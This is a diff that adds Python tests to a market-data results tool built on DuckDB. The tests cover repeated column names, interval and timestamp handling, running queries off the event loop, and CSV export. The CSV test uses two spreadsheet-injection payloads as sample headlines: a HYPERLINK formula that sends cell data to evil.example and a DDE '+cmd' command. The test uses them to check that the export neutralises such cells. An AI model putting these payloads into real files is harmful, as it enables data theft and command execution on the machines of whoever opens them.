@@ -3,11 +3,14 @@ results_sample, results_list, results_drop and results_export."""
 
 from __future__ import annotations
 
+import asyncio
 import datetime as dt
+import inspect
 import json
 import os
 import pathlib
 import re
+import time
 
 import pyarrow as pa
 import pyarrow.csv as pacsv
@@ -860,7 +863,7 @@ def test_a_query_computing_rows_from_other_rows_keeps_no_role(setup):
     }.items():
         role, _, notes = stored(sql)
         assert role is None and notes[-1] == note, sql
-    for sql, time in {
+    for sql, time_column in {
         f"SELECT * FROM {k} WHERE value > 1 UNION ALL SELECT * FROM {k} WHERE value <= 1": "event_time",
         f"SELECT m.*, x.name FROM {k} m, {exchanges} x": None,
         f"SELECT s.t, s.bid_price, m.value, m.knowledge_time FROM {b} s ASOF JOIN {k} m ON s.t >= m.event_time": (
@@ -870,7 +873,9 @@ def test_a_query_computing_rows_from_other_rows_keeps_no_role(setup):
         f"ASOF JOIN {b} s ON s.t >= m.event_time": None,
     }.items():
         role, kept_time, notes = stored(sql)
-        assert (role, kept_time) == ("available", time) and not any("keeps no role" in n for n in notes), sql
+        assert (role, kept_time) == ("available", time_column) and not any(
+            "keeps no role" in n for n in notes
+        ), sql
 
 
 def test_an_answer_reading_a_result_that_does_not_show_when_its_rows_became_known_keeps_no_role(setup):
@@ -1368,3 +1373,188 @@ def test_a_whole_answer_that_runs_out_of_time_stores_the_rows_read_cut(setup, mo
     monkeypatch.setattr(store, "query", broken)
     with pytest.raises(ToolError, match="out of memory"):
         call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id}", max_rows=200)
+
+
+def test_query_keeps_every_column_of_a_join_that_repeats_a_name(setup):
+    """a.close, b.close came back as one close holding b's value inline, and
+    with store=true failed as internal_error: a repeated name is renamed the
+    way DuckDB names it (close_1), with a note."""
+    ctx, _, _, small, *_ = setup
+    rid = small.result_id
+    sql = (
+        f"SELECT a.t, a.close, b.close FROM {rid} a JOIN {rid} b ON a.t = b.t "
+        f"WHERE a.ticker = 'AAPL' AND b.ticker = 'MSFT' ORDER BY a.t LIMIT 2"
+    )
+    out = call(ctx, "results_query", sql=sql)
+    assert isinstance(out, InlineResult)
+    assert [c.name for c in out.columns] == ["t", "close", "close_1"]
+    assert [(r["close"], r["close_1"]) for r in out.rows] == [
+        (pytest.approx(100.1), pytest.approx(110.1)),
+        (pytest.approx(100.11), pytest.approx(110.11)),
+    ]
+    assert any(
+        n.startswith("Repeated column names were renamed") and "close -> close_1" in n for n in out.notes
+    )
+    stored = call(ctx, "results_query", sql=sql, store=True)
+    assert isinstance(stored, ResultMarker)
+    assert [c.name for c in stored.columns] == ["t", "close", "close_1"]
+    star = call(
+        ctx, "results_query", sql=f"SELECT * FROM {rid} a JOIN {rid} b ON a.t = b.t AND a.ticker = b.ticker"
+    )
+    names = [c.name for c in star.columns]
+    assert len(names) == 26 and len(set(names)) == 26
+    assert all(set(names) - set(row) <= {"absent"} for row in star.rows)
+
+
+def test_sample_of_a_repeated_column_shows_it_once(setup):
+    ctx, _, bars, *_ = setup
+    out = call(ctx, "results_sample", result_id=bars.result_id, n=2, columns=["close", "close"])
+    assert [c.name for c in out.columns] == ["close"]
+    assert all(set(row) == {"close"} for row in out.rows)
+
+
+def test_query_answers_intervals_and_nanosecond_timestamps(setup):
+    """An INTERVAL answered as [months, days, nanoseconds] inline and failed
+    as internal_error when stored (Parquet has no Arrow month_day_nano type);
+    a TIMESTAMP_NS with sub-microsecond digits failed even inline."""
+    ctx, _, _, small, *_ = setup
+    sql = f"SELECT t, t - lag(t) OVER (ORDER BY t) AS gap FROM {small.result_id} WHERE ticker = 'AAPL' ORDER BY t"
+    out = call(ctx, "results_query", sql=sql)
+    assert [r["gap"] for r in out.rows] == [None, "00:01:00", "00:01:00", "00:01:00", "00:01:00"]
+    assert [c.type for c in out.columns] == ["TIMESTAMP WITH TIME ZONE", "VARCHAR"]
+    assert any(n.startswith("Interval column(s) gap are text") for n in out.notes)
+    stored = call(ctx, "results_query", sql=sql, store=True)
+    assert isinstance(stored, ResultMarker)
+    back = call(
+        ctx, "results_query", sql=f"SELECT max(epoch(CAST(gap AS INTERVAL))) AS s FROM {stored.result_id}"
+    )
+    assert back.rows == [{"s": 60.0}]
+    ns_sql = "SELECT TIMESTAMP_NS '2026-01-01 00:00:00.123456789' AS ns"
+    ns = call(ctx, "results_query", sql=ns_sql)
+    assert ns.rows == [{"ns": "2026-01-01T00:00:00.123456"}]
+    assert any("ns are cut to microseconds" in n for n in ns.notes)
+    assert isinstance(call(ctx, "results_query", sql=ns_sql, store=True), ResultMarker)
+
+
+def test_query_answers_intervals_inside_a_list_struct_or_map(setup):
+    """2026-10-19: only a top-level INTERVAL became text, so a list of them
+    (list(t - t0), array_agg(gap)), or one in a struct or map, still showed
+    [months, days, nanoseconds] inline and failed as internal_error stored."""
+    ctx, _, _, small, *_ = setup
+    sql = (
+        "SELECT list(t - t0 ORDER BY t) AS gaps, {'gap': INTERVAL 1 DAY} AS s, MAP {'a': INTERVAL 3 HOUR} AS m "
+        f"FROM (SELECT t, min(t) OVER () AS t0 FROM {small.result_id} WHERE ticker = 'AAPL')"
+    )
+    out = call(ctx, "results_query", sql=sql)
+    assert out.rows == [
+        {
+            "gaps": "['00:00:00', '00:01:00', '00:02:00', '00:03:00', '00:04:00']",
+            "s": "{'gap': 1 day}",
+            "m": "{a='03:00:00'}",
+        }
+    ]
+    assert [c.type for c in out.columns] == ["VARCHAR", "VARCHAR", "VARCHAR"]
+    (note,) = [n for n in out.notes if n.startswith("Interval column(s) gaps, s, m are text")]
+    assert "CAST(gaps AS INTERVAL[]) reads one back" in note
+    stored = call(ctx, "results_query", sql=sql, store=True)
+    assert isinstance(stored, ResultMarker)
+    back = call(
+        ctx,
+        "results_query",
+        sql=f"SELECT epoch(CAST(gaps AS INTERVAL[])[5]) AS s, epoch(CAST(s AS STRUCT(gap INTERVAL)).gap) AS d "
+        f"FROM {stored.result_id}",
+    )
+    assert back.rows == [{"s": 240.0, "d": 86400.0}]
+
+
+def test_csv_export_neutralises_third_party_formulas(setup):
+    """A headline starting with = (or +, -, @) was written as is, so a
+    spreadsheet opening the export ran it as a formula; third-party text now
+    gets a leading ', with a note. Other results and Parquet are unchanged."""
+    ctx, store, _, _, _, tmp_path = setup
+    headlines = [
+        '=HYPERLINK("https://evil.example/?d="&A2,"Fed statement")',
+        "+cmd|' /C calc'!A0",
+        "Plain",
+        None,
+    ]
+    rows = [
+        r.model_copy(update={"headline": h or "x", "summary": h})
+        for r, h in zip(news_rows(4), headlines, strict=True)
+    ]
+    news = store.put(
+        rows_to_table(rows, NewsItem),
+        tool="news_search",
+        model=NewsItem.schema_name,
+        provenance=provenance(),
+        risk="external_text",
+    )
+    out = call(ctx, "results_export", result_id=news.result_id, format="csv", file_name="news")
+    written = pacsv.read_csv(tmp_path / "out" / "news.csv").to_pydict()
+    assert written["headline"][:3] == ["'" + headlines[0], "'" + headlines[1], "Plain"]
+    assert written["summary"][:3] == ["'" + headlines[0], "'" + headlines[1], "Plain"]
+    assert any(n.startswith("4 third-party text cell(s) began with =, +, -, @") for n in out.notes)
+    call(ctx, "results_export", result_id=news.result_id, format="parquet", file_name="news")
+    assert (
+        pq.read_table(tmp_path / "out" / "news.parquet").column("headline").to_pylist()[:2] == headlines[:2]
+    )
+    plain = store.put(
+        pa.table({"s": ["-1.5", "=x"]}),
+        tool="results_query",
+        model="marketlens.QueryRow",
+        provenance=provenance(),
+    )
+    out = call(ctx, "results_export", result_id=plain.result_id, format="csv", file_name="plain")
+    assert pacsv.read_csv(
+        tmp_path / "out" / "plain.csv", convert_options=pacsv.ConvertOptions(column_types={"s": pa.string()})
+    ).column("s").to_pylist() == ["-1.5", "=x"]
+    assert out.notes == []
+
+
+def test_a_long_query_leaves_the_event_loop_and_the_light_tools_free(tmp_path):
+    """results_query ran DuckDB on the event loop: a query running to its
+    timeout froze every other call (and the session's messages) until it
+    stopped. It runs in the query thread now; results_list answers meanwhile."""
+    store = StoreRoot(tmp_path / "cache", StoreLimits(query_timeout_seconds=2)).session("s")
+    ctx = make_context(store=store)
+    heavy = (
+        "SELECT count(*) AS n FROM (SELECT unnest(range(5000)) AS a) t1, (SELECT unnest(range(5000)) AS b) t2, "
+        "(SELECT unnest(range(5000)) AS c) t3"
+    )
+
+    async def go():
+        gaps = []
+
+        async def ticker():
+            last = time.monotonic()
+            while True:
+                await asyncio.sleep(0.05)
+                now = time.monotonic()
+                gaps.append(now - last)
+                last = now
+
+        tick = asyncio.create_task(ticker())
+        query = asyncio.create_task(call_tool(SPECS["results_query"], ctx, sql=heavy))
+        await asyncio.sleep(0.3)
+        started = time.monotonic()
+        listed = await call_tool(SPECS["results_list"], ctx)
+        listed_after = time.monotonic() - started
+        with pytest.raises(ToolError) as info:
+            await query
+        tick.cancel()
+        return max(gaps), listed, listed_after, info.value.code
+
+    worst_gap, listed, listed_after, code = asyncio.run(go())
+    assert code == "sql_timeout"
+    assert isinstance(listed, InlineResult) and listed_after < 1.0
+    assert worst_gap < 1.0
+
+
+def test_every_store_bound_handler_runs_off_the_event_loop():
+    """The results and analytics handlers are synchronous store work wrapped
+    to run in a thread, so none of them can hold the event loop."""
+    from marketlens_mcp.analytics.tools import all_specs
+
+    for spec in (*rt.SPECS, *all_specs()):
+        inner = getattr(spec.handler, "__wrapped__", None)
+        assert inner is not None and not inspect.iscoroutinefunction(inner), spec.name
